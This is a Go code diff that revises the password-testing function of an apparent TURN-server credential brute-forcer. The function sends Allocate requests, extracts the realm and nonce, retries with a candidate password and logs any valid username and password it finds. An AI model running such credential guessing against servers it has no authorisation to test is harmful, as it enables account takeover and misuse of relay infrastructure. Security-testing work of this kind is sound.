@@ -68,34 +68,38 @@ func BruteForce(opts BruteforceOpts) error {
 }
 
 func testPassword(opts BruteforceOpts, password string) error {
-	conn, err := internal.Connect(opts.Protocol, opts.TurnServer, opts.UseTLS, opts.Timeout)
+	remote, err := internal.Connect(opts.Protocol, opts.TurnServer, opts.UseTLS, opts.Timeout)
 	if err != nil {
-		return fmt.Errorf("could not connect to %s: %w", opts.TurnServer, err)
+		return err
 	}
-	x := internal.RequestedTransport(1)
-	allocateRequest := internal.AllocateRequest(x, internal.AllocateProtocolIgnore)
-	allocateResponse, err := allocateRequest.SendAndReceive(opts.Log, conn, opts.Timeout)
+
+	addressFamily := internal.AllocateProtocolIgnore
+	allocateRequest := internal.AllocateRequest(internal.RequestedTransportUDP, addressFamily)
+	allocateResponse, err := allocateRequest.SendAndReceive(opts.Log, remote, opts.Timeout)
 	if err != nil {
-		return fmt.Errorf("error on sending allocate request: %w", err)
+		return fmt.Errorf("error on sending AllocateRequest: %w", err)
 	}
+	if allocateResponse.Header.MessageType.Class != internal.MsgTypeClassError {
+		return fmt.Errorf("MessageClass is not Error (should be not authenticated)")
+	}
+
 	realm := string(allocateResponse.GetAttribute(internal.AttrRealm).Value)
 	nonce := string(allocateResponse.GetAttribute(internal.AttrNonce).Value)
 
-	allocateRequest = internal.AllocateRequestAuth(opts.Username, password, nonce, realm, x, internal.AllocateProtocolIgnore)
-	allocateResponse, err = allocateRequest.SendAndReceive(opts.Log, conn, opts.Timeout)
+	allocateRequest = internal.AllocateRequestAuth(opts.Username, password, nonce, realm, internal.RequestedTransportUDP, addressFamily)
+	allocateResponse, err = allocateRequest.SendAndReceive(opts.Log, remote, opts.Timeout)
 	if err != nil {
-		opts.Log.Errorf("error on sending allocate request: %s", err)
+		return fmt.Errorf("error on sending AllocateRequest Auth: %w", err)
+	}
+	if allocateResponse.Header.MessageType.Class == internal.MsgTypeClassSuccess {
+		opts.Log.Infof("Found valid credentials: %s:%s", opts.Username, password)
 		return nil
 	}
-	if allocateResponse.Header.MessageType.Class != internal.MsgTypeClassSuccess {
-		errorCode := allocateResponse.GetAttribute(internal.AttrErrorCode).Value[4:]
-		if string(errorCode) == "Unauthorized" {
-			opts.Log.Warnf("[!] %s:%s credentials are incorrect", opts.Username, password)
-		} else {
-			opts.Log.Errorf("Unknown error: %s", string(errorCode))
-		}
-		return nil
+	// we got an error
+	errorCode := allocateResponse.GetAttribute(internal.AttrErrorCode).Value[4:]
+	if string(errorCode) != "Unauthorized" {
+		// get all other errors than auth errors
+		opts.Log.Errorf("Unknown error: %s", string(errorCode))
 	}
-	opts.Log.Infof("Found valid credentials: %s:%s", opts.Username, password)
 	return nil
 }
